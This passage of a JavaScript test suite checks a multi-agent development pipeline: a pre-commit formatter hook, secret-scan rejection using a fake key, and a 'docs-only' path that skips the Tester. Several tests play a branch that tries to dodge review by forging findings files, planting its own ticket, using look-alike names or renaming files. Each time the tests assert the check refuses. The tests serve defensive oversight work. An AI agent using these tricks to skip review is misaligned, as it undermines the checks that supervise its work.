  const f = path.join(r.base, "fmt.mjs"), log = path.join(r.base, "fmt.log");
  fs.writeFileSync(f, `import fs from "node:fs";
fs.appendFileSync(${JSON.stringify(log)}, process.argv.slice(2).join(" ") + "\\n");
${slow ? "Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 3000);" : ""}
for (const p of process.argv.slice(2)) { const s = fs.readFileSync(p, "utf8"); if (s.includes("broken")) { console.error("cannot parse " + p); process.exit(2); } fs.writeFileSync(p, s.replaceAll("messy", "tidy")); }
`);
  return { cmd: `node ${f}`, log };
}
function formatting(r, opts) { const f = formatter(r, opts); r.config({ commands: { formatStaged: f.cmd } }); r.git("add", "factory.config.json"); r.git("commit", "-qm", "config"); fs.writeFileSync(f.log, ""); return f; }
const modeOf = (r, rev, p) => r.git("ls-tree", rev, "--", p).split(" ")[0];

test("format-staged is off without commands.formatStaged: the commit is exactly what was staged", () => {
  const r = repo();
  r.write("src/b.js", "messy\n"); r.git("add", "src/b.js"); r.git("commit", "-qm", "b");
  assert.equal(r.git("show", "HEAD:src/b.js"), "messy");
});

test("format-staged formats fully staged files, skips partially staged ones untouched, skips deleted files and follows renames (findings 5, 7)", () => {
  const r = repo();
  r.write("src/part.js", "one messy\n"); r.write("src/gone.js", "x\n"); r.write("src/old.js", "renamed messy\n");
  r.git("add", "-A"); r.git("commit", "-qm", "files");
  const f = formatting(r);
  r.write("src/full.js", "full messy\n");
  r.write("src/part.js", "one messy\ntwo messy\n"); r.git("add", "src/full.js", "src/part.js");
  r.write("src/part.js", "one messy\ntwo messy\nthree messy, unstaged\n");
  r.git("rm", "-q", "src/gone.js"); r.git("mv", "src/old.js", "src/new.js");
  const c = r.gitTry("commit", "-qm", "work");
  assert.equal(c.status, 0, c.stdout + c.stderr);
  assert.match(c.stdout + c.stderr, /partially staged file\(s\) not formatted.*src\/part\.js/);
  assert.equal(r.git("show", "HEAD:src/full.js"), "full tidy");
  assert.equal(r.git("show", "HEAD:src/part.js"), "one messy\ntwo messy", "a partially staged file is committed as staged");
  assert.equal(r.git("show", "HEAD:src/new.js"), "renamed tidy");
  assert.equal(r.read("src/part.js"), "one messy\ntwo messy\nthree messy, unstaged\n", "the unstaged working copy is untouched");
  assert.equal(r.gitTry("cat-file", "-e", "HEAD:src/gone.js").status === 0, false, "the deletion is committed");
  const passed = fs.readFileSync(f.log, "utf8");
  assert.doesNotMatch(passed, /gone\.js|old\.js|part\.js/, "deleted, renamed-away and partially staged paths are not passed"); assert.match(passed, /src\/new\.js/);
});

test("format-staged keeps the staged mode: an unstaged chmod is not committed, a staged one is not lost (finding 4)", () => {
  const r = repo();
  r.write("src/run.sh", "messy\n", 0o755); r.git("add", "-A"); r.git("commit", "-qm", "exec");
  formatting(r);
  // H2: content fully staged, chmod +x not staged.
  r.write("src/plain.js", "messy\n"); r.git("add", "src/plain.js"); fs.chmodSync(path.join(r.dir, "src/plain.js"), 0o755);
  let c = r.gitTry("commit", "-qm", "plain"); assert.equal(c.status, 0, c.stderr);
  assert.equal(modeOf(r, "HEAD", "src/plain.js"), "100644"); assert.equal(r.git("show", "HEAD:src/plain.js"), "messy", "a file with an unstaged mode change is partially staged: not formatted");
  // A fully staged executable keeps 100755 when its formatted bytes are staged.
  r.write("src/run.sh", "more messy\n"); r.git("add", "src/run.sh");
  c = r.gitTry("commit", "-qm", "run"); assert.equal(c.status, 0, c.stderr);
  assert.equal(modeOf(r, "HEAD", "src/run.sh"), "100755"); assert.equal(r.git("show", "HEAD:src/run.sh"), "more tidy");
  // G: staged executable, then deleted in the working tree: skipped, committed as staged.
  r.write("src/run.sh", "again messy\n"); r.git("add", "src/run.sh"); fs.rmSync(path.join(r.dir, "src/run.sh"));
  c = r.gitTry("commit", "-qm", "g"); assert.equal(c.status, 0, c.stderr);
  assert.equal(modeOf(r, "HEAD", "src/run.sh"), "100755"); assert.equal(r.git("show", "HEAD:src/run.sh"), "again messy");
  assert.ok(!fs.existsSync(path.join(r.dir, "src/run.sh")), "the working-tree deletion stays");
});

test("format-staged after a killed hook leaves no unstaged work lost (finding 5)", () => {
  const r = repo();
  r.write("docs/a.md", "messy\n"); r.git("add", "-A"); r.git("commit", "-qm", "a");
  formatting(r, { slow: true });
  r.write("docs/a.md", "messy staged\n"); r.git("add", "docs/a.md"); r.write("docs/a.md", "messy staged\nMY UNSTAGED WORK\n");
  r.write("docs/b.md", "messy b\n"); r.git("add", "docs/b.md");
  const run = spawnSync("sh", ["-c", "git commit -qm x & pid=$!; sleep 1.5; pkill -9 -P $pid; kill -9 $pid; wait"], { cwd: r.dir, encoding: "utf8" });
  assert.ok(run.status !== null);
  assert.equal(r.read("docs/a.md"), "messy staged\nMY UNSTAGED WORK\n", "a partially staged file is never touched");
  r.git("add", "-A"); const c = r.gitTry("commit", "-qm", "after the kill");
  assert.equal(c.status, 0, c.stderr); assert.equal(r.git("show", "HEAD:docs/a.md"), "messy staged\nMY UNSTAGED WORK".replace("messy", "tidy"));
});

test("format-staged leaves `git commit -- <path>` alone, so the real index never keeps a revert (finding 6)", () => {
  const r = repo(); formatting(r);
  r.write("docs/a.md", "messy a\n"); r.git("add", "docs/a.md");
  const c = r.gitTry("commit", "-qm", "x", "--", "docs/a.md");
  assert.equal(c.status, 0, c.stderr); assert.match(c.stdout + c.stderr, /commit with paths/);
  assert.equal(r.git("status", "--porcelain", "--", "docs/a.md"), "", "index, HEAD and working tree agree");
});

test("format-staged: a formatter failure rejects the commit and leaves the staged and working-tree files as they were", () => {
  const r = repo();
  r.write("src/p.js", "a\n"); r.write("src/q.js", "q\n"); r.git("add", "-A"); r.git("commit", "-qm", "p");
  formatting(r);
  const head = r.git("rev-parse", "HEAD");
  r.write("src/p.js", "a\nbroken\n"); r.write("src/q.js", "q messy\n"); r.git("add", "src/p.js", "src/q.js");
  const c = r.gitTry("commit", "-qm", "broken");
  assert.notEqual(c.status, 0); assert.match(c.stderr, /formatter failed/); assert.match(c.stderr, /cannot parse src\/p\.js/);
  assert.equal(r.git("rev-parse", "HEAD"), head);
  assert.equal(r.read("src/q.js"), "q messy\n"); assert.equal(r.git("show", ":src/q.js"), "q messy");
});

test("format-staged: a later pre-commit failure takes the formatting back (finding 12)", () => {
  const r = repo(); formatting(r);
  r.write("src/s.js", 'messy\nconst k = "' + "sk-" + "A".repeat(24) + '";\n'); r.git("add", "src/s.js");
  const c = r.gitTry("commit", "-qm", "secret");
  assert.notEqual(c.status, 0); assert.match(c.stderr, /secrets/); assert.match(c.stderr, /taken back/);
  assert.match(r.git("show", ":src/s.js"), /^messy/, "the index holds what was staged"); assert.match(r.read("src/s.js"), /^messy/);
});

test("format-staged: an invalid paths setting fails with a readable message (finding 11)", () => {
  const r = repo(); const f = formatter(r);
  r.config({ commands: { formatStaged: { command: f.cmd, paths: "**/*.js" } } }); r.git("add", "factory.config.json");
  const c = r.gitTry("commit", "-qm", "config");
  assert.notEqual(c.status, 0); assert.match(c.stderr, /commands\.formatStaged must be/); assert.doesNotMatch(c.stderr, /TypeError/);
});

test("format-staged honours a paths filter and leaves a merge commit alone", () => {
  const r = repo(); const f = formatter(r);
  r.config({ commands: { formatStaged: { command: f.cmd, paths: ["**/*.js"] } } }); r.git("add", "factory.config.json"); r.git("commit", "-qm", "config");
  r.write("src/c.js", "messy\n"); r.write("docs/c.md", "messy\n"); r.git("add", "-A"); r.git("commit", "-qm", "c");
  assert.equal(r.git("show", "HEAD:src/c.js"), "tidy"); assert.equal(r.git("show", "HEAD:docs/c.md"), "messy", "outside the filter");
  r.git("checkout", "-q", "-b", "side", "HEAD~1");
  r.write("src/side.js", "messy\n"); r.git("add", "-A"); r.git(...NOHOOKS, "commit", "-qm", "side");
  r.git("checkout", "-q", "main");
  const m = r.gitTry("merge", "--no-ff", "--no-edit", "side");
  assert.equal(m.status, 0, m.stdout + m.stderr);
  assert.equal(r.git("show", "HEAD:src/side.js"), "messy", "a merge commit is not reformatted");
});

test("docsonly.mjs uses main's setting and check, journals only a docs-only verdict, and stops on a failed fetch (findings 13, 14)", () => {
  const r = repo();
  branch(r, "agents/t1", () => r.write("docs/guide.md", "v2\n")); r.git("push", "-q", "origin", "agents/t1");
  branch(r, "agents/t2", () => r.write("src/app.js", "export const a = 7;\n")); r.git("push", "-q", "origin", "agents/t2");
  const ctl = path.join(r.base, "controller"); fs.mkdirSync(ctl);
  for (const f of ["lib.mjs", "cli.mjs", "docsonly.mjs"]) fs.copyFileSync(path.join(ROOT, "controller", f), path.join(ctl, f));
  // The Controller's copy says enabled; only main's config counts.
  fs.writeFileSync(path.join(ctl, "factory.config.json"), JSON.stringify({ project: { name: "demo", mainBranch: "main" }, docsOnly: { enabled: true }, hosts: { controller: { host: "local", controllerDir: ctl }, workers: [{ name: "local", kind: "local", projectDir: r.dir }] } }));
  const run = (...a) => spawnSync("node", [path.join(ctl, "docsonly.mjs"), ...a], { encoding: "utf8", env: { ...process.env, FACTORY_CONFIG: "" } });
  let out = run("T1", "agents/t1"); assert.equal(out.status, 3); assert.match(out.stdout, /docsOnly\.enabled is not set in origin\/main/);
  r.setMain({ docsOnly: { enabled: true } });
  out = run("T1", "agents/t1"); assert.equal(out.status, 0, out.stdout + out.stderr); assert.match(out.stdout, /verdict=docs-only/);
  out = run("T2", "agents/t2"); assert.equal(out.status, 3, out.stdout + out.stderr);
  const events = fs.readFileSync(path.join(ctl, "journal.ndjson"), "utf8").trim().split("\n").map((l) => JSON.parse(l));
  assert.deepEqual(events.map((e) => [e.type, e.task, e.verdict, e.path, e.paths]), [["review", "T1", "docs-only", "docs-only", ["docs/guide.md"]]], "only the review a docs-only verdict replaces is journaled");
  assert.match(events[0].head, /^[0-9a-f]{40}$/);
  r.git("remote", "set-url", "origin", path.join(r.base, "no-such-remote.git"));
  out = run("T1", "agents/t1"); assert.equal(out.status, 4); assert.match(out.stdout, /git fetch failed/);
});

test("the new pre-commit still commits with a locally kept older guardrails script that has no format-staged", () => {
  const r = repo();
  const g = path.join(r.dir, "tools/factory-guardrails.mjs");
  fs.writeFileSync(g, fs.readFileSync(g, "utf8").replaceAll("format-staged", "fmt-removed"));
  r.write("src/d.js", "messy\n"); r.git("add", "src/d.js");
  const c = r.gitTry("commit", "-qm", "d");
  assert.equal(c.status, 0, c.stdout + c.stderr);
});

test("configured paths are normalised before they feed the never-docs set or the allowlist; one outside the repository is refused (re-review A)", () => {
  const r = repo();
  // The reviewer's probe: tasksDir "./docs/tickets" with the default allowlist made a ticket docs-only.
  for (const tasksDir of ["./docs/tickets", "/docs/tickets", "docs/tickets/", "docs\\tickets\\", "Docs/Tickets", ".//docs//tickets"]) {
    r.setMain({ steering: { tasksDir } });
    const out = r.check(branch(r, `t${Math.random().toString(36).slice(2)}`, () => r.write("docs/tickets/T05.md", `Status: integrated ${Math.random()}\n`)));
    assert.equal(out.status, 3, `${tasksDir}: ${out.stdout}`); assert.match(out.stdout, /installed or read by the factory/);
  }
  for (const tasksDir of ["../tickets", "docs/../../x", "C:/tickets", ".", "", "docs/*", 7]) {
    r.setMain({ steering: { tasksDir } });
    const out = r.check(branch(r, `u${Math.random().toString(36).slice(2)}`, () => r.write("docs/guide.md", `v ${Math.random()}\n`)));
    assert.equal(out.status, 4, `${JSON.stringify(tasksDir)}: ${out.stdout}`); assert.match(out.stdout, /steering\.tasksDir must name a directory/);
  }
  r.setMain({ docsOnly: { paths: ["./handbook/**", "/*.md"] } });
  assert.equal(r.check(branch(r, "hbn", () => { r.write("handbook/a.md", "x\n"); r.write("NOTES.md", "x\n"); })).status, 0, "./ and / prefixes in docsOnly.paths are normalised");
  for (const paths of [["../handbook/**"], ["handbook/../../x/**"], ["C:\\docs\\**"]]) {
    r.setMain({ docsOnly: { paths } });
    assert.equal(r.check(branch(r, `v${Math.random().toString(36).slice(2)}`, () => r.write("docs/guide.md", `v ${Math.random()}\n`))).status, 4, JSON.stringify(paths));
  }
});

// --- the ticket's own process files: the docs-only path in the Controller's real flow (acceptance run 2, N1) ------------
// Every task branch of the flow carries its architecture spec review (merged in from the Architect's branch) and its report.
// They count only for the ticket the Controller names, only as new files and never as findings. Everything else under the
// review, report and ticket directories keeps a branch off the docs-only path (the first review of #52, findings 1 and 2).
const SPEC_TEXT = "# T03 architecture spec\nVerdict: pass\nSpec: docs/tasks/T03-document-api.md 0123456789abcdef0123456789abcdef01234567\nLevel: 1\n";
const onMain = (r, files) => {
  for (const [p, v] of Object.entries(files)) r.write(p, v);
  r.git("add", "-A"); r.git(...NOHOOKS, "commit", "-qm", "main"); r.git(...NOHOOKS, "push", "-q", "origin", "main");
};
// A project with three tickets (T03, its look-alike T030, T04) on main and docsOnly on.
function ticketRepo(cfg = {}) {
  const r = repo({ docsOnly: { enabled: true }, ...cfg });
  onMain(r, { "docs/tasks/T03-document-api.md": "Status: ready\n", "docs/tasks/T030-other.md": "Status: ready\n", "docs/tasks/T04-other.md": "Status: ready\n" });
  return r;
}
// The Controller's own checkout and scripts around that project; run() is `node docsonly.mjs …`.
function docsController(r) {
  const ctl = fs.mkdtempSync(path.join(r.base, "ctl-docsonly-"));
  for (const f of ["lib.mjs", "cli.mjs", "docsonly.mjs"]) fs.copyFileSync(path.join(ROOT, "controller", f), path.join(ctl, f));
  fs.writeFileSync(path.join(ctl, "factory.config.json"), JSON.stringify({ project: { name: "demo", mainBranch: "main" }, hosts: { controller: { host: "local", controllerDir: ctl }, workers: [{ name: "local", kind: "local", projectDir: r.dir }] } }));
  const run = (...a) => spawnSync("node", [path.join(ctl, "docsonly.mjs"), ...a], { encoding: "utf8", env: { ...process.env, FACTORY_CONFIG: "" } });
  const journal = () => { const f = path.join(ctl, "journal.ndjson"); return fs.existsSync(f) ? fs.readFileSync(f, "utf8").trim().split("\n").map((l) => JSON.parse(l)) : []; };
  return { run, journal };
}
const commit = (r, msg) => { r.git("add", "-A"); r.git(...NOHOOKS, "commit", "-qm", msg); };
// What the flow does for one ticket: the Architect's branch with the spec review; the Developer's branch from main that
// merges it, writes the report as a draft and again at the end, changes the README (and code, if asked), and merges main
// (which moved on meanwhile) last. Both pushed; the checkout ends on main.
function flow(r, { ticket = "T03", report = "T03-document-api", code = "", readme = "# Demo\nA line more.\n", spec = SPEC_TEXT } = {}) {
  const t = ticket.toLowerCase(), review = `agents/${t}-specreview`;
  r.git("checkout", "-q", "-b", review, "main"); r.write(`docs/reviews/${ticket}-architecture-spec.md`, spec); commit(r, "spec review"); r.git("push", "-q", "origin", review);
  r.git("checkout", "-q", "-b", `agents/${t}`, "main"); r.git(...NOHOOKS, "merge", "-q", review);
  r.write(`docs/reports/${report}.md`, "# Report\n- [ ] README\n"); commit(r, "report draft");
  r.write("README.md", readme); commit(r, "readme");
  if (code) { r.write("src/app.js", code); commit(r, "code"); }
  r.write(`docs/reports/${report}.md`, "# Report\n- [x] README\n\n## Rework 1\nfixed\n"); commit(r, "report final");
  r.git("checkout", "-q", "main"); onMain(r, { "docs/guide.md": "Guide, moved on main\n" });
  r.git("checkout", "-q", `agents/${t}`); r.git(...NOHOOKS, "merge", "-q", "--no-ff", "-m", "merge main", "main"); r.git("push", "-q", "origin", `agents/${t}`);
  r.git("checkout", "-q", "main");
  return `agents/${t}`;
}
// A branch with exactly these files (null deletes one, { text, mode } sets a mode, { link } makes a symlink), judged as `task`.
function attempt(r, c, files, { task = "T03", name = "agents/t03", args = [] } = {}) {
  r.git("checkout", "-q", "-b", name, "main");
  for (const [p, v] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(r.dir, p)), { recursive: true });
    if (v === null) fs.rmSync(path.join(r.dir, p)); else if (typeof v === "string") r.write(p, v); else if (v.link) fs.symlinkSync(v.link, path.join(r.dir, p)); else r.write(p, v.text, v.mode);
  }
  commit(r, name); r.git("push", "-q", "origin", name); r.git("checkout", "-q", "main");
  const out = c.run(task, name, ...args);
  r.git("branch", "-q", "-D", name); r.git("push", "-q", "origin", "--delete", name);
  return out;
}
const SPEC = "docs/reviews/T03-architecture-spec.md", REPORT = "docs/reports/T03-document-api.md";

test("the flow's own branch of a README ticket (spec review merged in, report written over several commits, main merged last) takes the docs-only path: no Tester, journaled with the ticket", () => {
  const r = ticketRepo(), c = docsController(r);
  flow(r);
  const out = c.run("T03", "agents/t03");
  assert.equal(out.status, 0, out.stdout + out.stderr);
  assert.match(out.stdout, /A "README.md"|M "README.md"/); assert.match(out.stdout, /"docs\/reviews\/T03-architecture-spec\.md"  \(spec review of T03\)/); assert.match(out.stdout, /"docs\/reports\/T03-document-api\.md"  \(report of T03\)/);
  assert.match(out.stdout, /verdict=docs-only reason="all 3 paths are documentation, 2 of them the ticket's own process files"/);
  const [event, ...more] = c.journal();
  assert.deepEqual([event.type, event.task, event.verdict, event.ticket, more.length], ["review", "T03", "docs-only", "T03", 0]);
  assert.deepEqual(event.paths.sort(), [REPORT, "README.md", SPEC].sort());
});

test("the same branch with one line of code is not docs-only: the Tester runs, nothing is journaled, and the push gate still wants a review for the code", () => {
  const r = ticketRepo(), c = docsController(r);
  r.setMain({ docsOnly: { enabled: true }, commands: { formatCheck: "true" } });
  flow(r, { code: "export const a = 2;\n" });
  const out = c.run("T03", "agents/t03");
  assert.equal(out.status, 3, out.stdout); assert.match(out.stdout, /"src\/app\.js"  <- /); assert.match(out.stdout, /verdict=not-docs-only/);
  assert.deepEqual(c.journal(), []);
  const w = wave(r, ["agents/t03"], { gate: '#!/bin/sh\nexec "$@"\n', verify: "true" });
  assert.match(w.stdout, /GATE-PATH full/); assert.match(w.stdout, /PUSH-FAILED/); assert.doesNotMatch(w.stdout, /PUSHED main/);
  assert.equal(r.git("show", "origin/main:src/app.js"), "export const a = 1;");
});

test("the wave after a docs-only task: no review branch is needed for the push gate; the wave runs the full gate because the process files and the status branch are in it", () => {
  const r = ticketRepo(), c = docsController(r);
  r.setMain(checks(r)); flow(r);
  assert.equal(c.run("T03", "agents/t03").status, 0);
  // The Controller's status branch of the wave: it sets Status: integrated in the ticket (CONTROLLER.md, step 2).
  r.git("checkout", "-q", "-b", "status-wave-1", "main"); r.write("docs/tasks/T03-document-api.md", "Status: integrated\n"); commit(r, "status"); r.git("checkout", "-q", "main");
  const w = wave(r, ["agents/t03", "status-wave-1"], { gate: '#!/bin/sh\nexec "$@"\n', verify: "echo VERIFY-RAN" });
  assert.equal(w.status, 0, w.stdout + w.stderr);
  assert.match(w.stdout, /GATE-PATH full: not docs-only/); assert.match(w.stdout, /verify PASS/); assert.match(w.stdout, /PUSHED main/);
  assert.equal(r.git("show", "origin/main:README.md"), "# Demo\nA line more.");
  assert.equal(r.git("show", `origin/main:${REPORT}`).includes("Rework 1"), true);
  assert.equal(fs.existsSync(path.join(r.base, "marks")), false, "no format or Markdown check ran instead of the gate");
});

test("without a ticket the check is as it was: the spec review and the report keep a branch off the docs-only path; the wave's own call has none", () => {
  const r = ticketRepo(); flow(r);
  const out = r.check("main..agents/t03", "--base", "main");
  assert.equal(out.status, 3, out.stdout); assert.match(out.stdout, /docs\/reviews\/T03-architecture-spec\.md"?  <- installed or read by the factory/); assert.match(out.stdout, /docs\/reports\/T03-document-api\.md"?  <- installed or read by the factory/);
  for (const bad of [["--ticket"], ["--ticket", "--json"], ["--issue", "12"], ["--staged", "--ticket", "T03"], ["--ticket", "T03"]]) assert.equal(r.check(...bad).status, 2, `usage error: ${bad.join(" ")}`);
  for (const id of ["../T03", "T03/x", "", ".T03", "T03 x", "a..b"]) assert.equal(r.check("main..agents/t03", "--ticket", id).status, 4, `ticket id ${JSON.stringify(id)}`);
});

test("only the ticket's own two names count, as new files: other tickets, look-alikes, case variants, second files, findings names and tickets all keep the Tester", () => {
  const r = ticketRepo(), c = docsController(r);
  const readme = { "README.md": "# Demo\nmore\n" };
  const refused = (files, re, opts) => { const out = attempt(r, c, { ...readme, ...files }, opts); assert.equal(out.status, 3, `${Object.keys(files)}: ${out.stdout}`); if (re) assert.match(out.stdout, re); return out; };
  assert.equal(attempt(r, c, { ...readme, [SPEC]: SPEC_TEXT, [REPORT]: "r\n" }).status, 0, "control: the two names of T03 pass");
  refused({ "docs/reviews/T04-architecture-spec.md": SPEC_TEXT, "docs/reports/T04-other.md": "r\n" }, /T04-architecture-spec\.md"?  <- installed or read by the factory/);
  refused({ "docs/reviews/T030-architecture-spec.md": SPEC_TEXT, "docs/reports/T030-other.md": "r\n" }, /T030-architecture-spec\.md"?  <- installed/);
  refused({ "docs/reviews/t03-architecture-spec.md": SPEC_TEXT }, /t03-architecture-spec\.md"?  <- installed/);
  refused({ "docs/reports/t03-document-api.md": "r\n" }, /<- installed/);
  refused({ [SPEC]: SPEC_TEXT, "docs/reviews/T03-architecture-spec-2.md": SPEC_TEXT }, /spec-2\.md"?  <- installed/);
  refused({ [REPORT]: "r\n", "docs/reports/T03-document-api-2.md": "r\n", "docs/reports/T03-second.md": "r\n" }, /second\.md"?  <- installed/);
  for (const f of ["docs/reviews/T03-review-1.md", "docs/reviews/T03-review-final.md", "docs/reviews/T03-architecture-conformance.md", "docs/reviews/anything.md", "docs/reports/anything.md", "docs/handoffs/T03.md"]) refused({ [f]: "Verdict: pass\n" }, /<- installed/);
  refused({ "docs/tasks/T03-document-api.md": "Status: integrated\n" }, /T03-document-api\.md"?  <- installed/);
  refused({ "docs/tasks/T05-new.md": "Status: integrated\n" }, /T05-new\.md"?  <- installed/);
  refused({ [SPEC]: SPEC_TEXT, "docs/tasks/T03-document-api.md": "Status: integrated\n" }, /tasks\/T03-document-api\.md"?  <- installed/);
  assert.deepEqual(c.journal().map((e) => e.task), ["T03"], "only the control was journaled");
});

test("a process file that exists on the base, is changed, removed, renamed in, a link, or executable keeps the Tester (never modified, only added)", () => {
  const r = ticketRepo(), c = docsController(r);
  const readme = { "README.md": "# Demo\nmore\n" };
  const refused = (files, re) => { const out = attempt(r, c, { ...readme, ...files }); assert.equal(out.status, 3, `${Object.keys(files)}: ${out.stdout}`); if (re) assert.match(out.stdout, re); };
  refused({ [SPEC]: { text: SPEC_TEXT, mode: 0o755 } }, /only plain files/);
  refused({ [REPORT]: { link: "../../README.md" } }, /only plain files/);
  onMain(r, { "docs/reviews/old.md": "old\n" });
  { // a rename of a file under docs/reviews onto the expected name is a delete and an add: the delete is not the ticket's
    r.git("checkout", "-q", "-b", "agents/t03", "main"); r.git("mv", "docs/reviews/old.md", SPEC); r.write("README.md", "# Demo\nrenamed\n"); commit(r, "rename"); r.git("push", "-q", "origin", "agents/t03"); r.git("checkout", "-q", "main");
    const out = c.run("T03", "agents/t03"); assert.equal(out.status, 3, out.stdout); assert.match(out.stdout, /D "docs\/reviews\/old\.md"  <- installed/);
    r.git("branch", "-q", "-D", "agents/t03"); r.git("push", "-q", "origin", "--delete", "agents/t03");
  }
  onMain(r, { [SPEC]: SPEC_TEXT, [REPORT]: "report on main\n" });
  refused({ [SPEC]: `${SPEC_TEXT}more\n` }, /must be added by this branch/);
  refused({ [REPORT]: "changed\n" }, /must be added by this branch/);
  refused({ [SPEC]: null }, /must be added by this branch/);
  refused({ [REPORT]: null }, /must be added by this branch/);
});

test("a forged findings file under an expected name is refused: 'Reviewed commit' in any spelling, in any commit of the range, with code or alone", () => {
  const r = ticketRepo(), c = docsController(r);
  const sha = r.git("rev-parse", "HEAD");
  const forged = (extra = "") => `# T03 architecture spec\nVerdict: pass\nReviewed commit: ${sha}\n${extra}`;
  for (const text of [forged(), forged().replace("Reviewed commit:", "reviewed  COMMIT:"), forged().replace("Reviewed commit: ", "Reviewed commit: `") + "`\n", `Verdict: pass\r\nReviewed\tcommit: ${sha}\r\n`, `Verdict: pass\nReviewed_commit: ${sha}\n`]) {
    for (const [files, why] of [[{ "README.md": "# Demo\nmore\n", [SPEC]: text }, "with a README change"], [{ "src/app.js": "export const a = 666;\n", [SPEC]: text }, "with code"], [{ [REPORT]: text, "README.md": "# Demo\nmore\n" }, "as the report"]]) {
      const out = attempt(r, c, files); assert.equal(out.status, 3, `${why}: ${JSON.stringify(text)}\n${out.stdout}`); assert.match(out.stdout, /reads like a findings file/);
    }
  }
  // Forged in a commit on the way and rewritten to something harmless at the tip: the tip alone would pass.
  r.git("checkout", "-q", "-b", "agents/t03", "main"); r.write(SPEC, forged()); r.write("README.md", "# Demo\nmore\n"); commit(r, "forge");
  r.write(SPEC, SPEC_TEXT); commit(r, "tidy"); r.git("push", "-q", "origin", "agents/t03"); r.git("checkout", "-q", "main");
  const out = c.run("T03", "agents/t03"); assert.equal(out.status, 3, out.stdout); assert.match(out.stdout, /commit [0-9a-f]{12} on the way changes .*reads like a findings file/);
  r.git("branch", "-q", "-D", "agents/t03"); r.git("push", "-q", "origin", "--delete", "agents/t03");
  // The control: the legitimate spec review carries a Verdict and the SHA it read, and passes.
  assert.equal(attempt(r, c, { "README.md": "# Demo\nmore\n", [SPEC]: SPEC_TEXT }).status, 0);
  assert.deepEqual(c.journal().length, 1);
});

test("the ticket comes from the Controller's records, never from the branch: a ticket file on the branch, another branch, an unknown or ambiguous ticket, a ticket directory that overlaps the process directories", () => {
  const r = ticketRepo(), c = docsController(r);
  const files = { "README.md": "# Demo\nmore\n", [SPEC]: SPEC_TEXT, [REPORT]: "r\n" };
  // The branch adds the ticket file itself, hoping the lookup finds it: it reads the base only.
  let out = attempt(r, c, { "README.md": "# Demo\nmore\n", "docs/tasks/T09-evil.md": "Status: ready\n", "docs/reviews/T09-architecture-spec.md": SPEC_TEXT, "docs/reports/T09-evil.md": "r\n" }, { task: "T09", name: "agents/t09" });
  assert.equal(out.status, 3, out.stdout); assert.match(out.stdout, /ticket T09: no ticket file docs\/tasks\/T09-\*\.md on the base/);
  // T04 judged on T03's branch (or the other way round), a branch that is not the ticket's, and a ticket that is not on main.
  out = attempt(r, c, files, { task: "T04" }); assert.equal(out.status, 3, out.stdout); assert.match(out.stdout, /note: origin\/agents\/t03 is not the branch of T04/);
  out = attempt(r, c, { ...files, "docs/reviews/T04-architecture-spec.md": SPEC_TEXT }, { task: "T04", name: "agents/t04" }); assert.equal(out.status, 3, out.stdout);
  out = attempt(r, c, files, { task: "T03", name: "feature/t03" }); assert.equal(out.status, 3, out.stdout); assert.match(out.stdout, /is not the branch of T03/);
  out = attempt(r, c, files, { task: "T03", name: "agents/T03" }); assert.equal(out.status, 3, out.stdout);
  // Two ticket files for one id on the base: unclear which report is the ticket's.
  onMain(r, { "docs/tasks/T03-copy.md": "Status: ready\n" });
  out = attempt(r, c, files); assert.equal(out.status, 3, out.stdout); assert.match(out.stdout, /more than one ticket file/);
  // A project whose tickets live in the reports directory: a report there would BE a ticket file (Status: integrated releases dependents).
  const q = repo({ docsOnly: { enabled: true }, steering: { tasksDir: "docs/reports" } }), d = docsController(q);
  onMain(q, { "docs/reports/T03-document-api.md": "Status: ready\n" });
  out = attempt(q, d, { "README.md": "# Demo\nmore\n", [SPEC]: SPEC_TEXT, "docs/reports/T03-document-api.md": "Status: integrated\n" });
  assert.equal(out.status, 3, out.stdout);
  assert.deepEqual([...c.journal(), ...d.journal()], [], "none of these was journaled");
});

test("a ticket directory outside docs/ and a custom allowlist: the process files still pass, the tickets stay refused", () => {
  const r = repo({ docsOnly: { enabled: true, paths: ["handbook/**"] }, steering: { tasksDir: "work/tickets" } }), c = docsController(r);
  onMain(r, { "work/tickets/T03-document-api.md": "Status: ready\n", "handbook/intro.md": "x\n" });
  let out = attempt(r, c, { "handbook/intro.md": "y\n", [SPEC]: SPEC_TEXT, [REPORT]: "r\n" });
  assert.equal(out.status, 0, out.stdout + out.stderr);
  out = attempt(r, c, { "handbook/intro.md": "z\n", "work/tickets/T03-document-api.md": "Status: integrated\n" });
  assert.equal(out.status, 3, out.stdout); assert.match(out.stdout, /work\/tickets\/T03-document-api\.md"?  <- installed/);
  out = attempt(r, c, { [SPEC]: SPEC_TEXT, [REPORT]: "r\n" });
  assert.equal(out.status, 3, out.stdout); assert.match(out.stdout, /only the ticket's own process files \(2\), no change to documentation/);
});

test("github-issues mode: the report is issue-<n>.md named by the Controller's --ref, any other issue number is refused, and a missing --ref accepts the spec review only", () => {
  const r = repo({ docsOnly: { enabled: true }, steering: { mode: "github-issues" } }), c = docsController(r);
  const spec = "docs/reviews/I12-architecture-spec.md", files = { "README.md": "# Demo\nmore\n", [spec]: SPEC_TEXT, "docs/reports/issue-12.md": "r\n" };
  const opts = { task: "I12", name: "agents/i12" };
  assert.equal(attempt(r, c, files, { ...opts, args: ["--ref", "#12"] }).status, 0);
  let out = attempt(r, c, files, { ...opts, args: ["--ref", "#13"] }); assert.equal(out.status, 3, out.stdout); assert.match(out.stdout, /issue-12\.md"?  <- installed/);
  out = attempt(r, c, files, opts); assert.equal(out.status, 3, out.stdout); assert.match(out.stdout, /issue-12\.md"?  <- installed/);
  assert.equal(attempt(r, c, { "README.md": "# Demo\nmore\n", [spec]: SPEC_TEXT }, opts).status, 0);
  out = attempt(r, c, { ...files, "docs/reports/issue-13.md": "r\n" }, { ...opts, args: ["--ref", "#12"] }); assert.equal(out.status, 3, out.stdout);
  assert.notEqual(c.run("I12", "agents/i12", "--ref").status, 0, "--ref without a value is a usage error");
});

test("a check on main that does not know --ticket (an older tools/factory-guardrails.mjs) gives no verdict: the Tester runs, nothing is journaled", () => {
  const r = ticketRepo(), c = docsController(r);
  flow(r);
  fs.writeFileSync(path.join(r.dir, "tools/factory-guardrails.mjs"), 'if (process.argv.includes("--ticket")) { console.error("usage: docs-only [<base>..<head>]"); process.exit(2); }\n');
  r.git("add", "-A"); r.git(...NOHOOKS, "commit", "-qm", "an older check"); r.git(...NOHOOKS, "push", "-q", "origin", "main");
  const out = c.run("T03", "agents/t03");
  assert.equal(out.status, 4, out.stdout); assert.match(out.stdout, /the docs-only check gave no verdict \(exit 2\)/);
  assert.deepEqual(c.journal(), []);
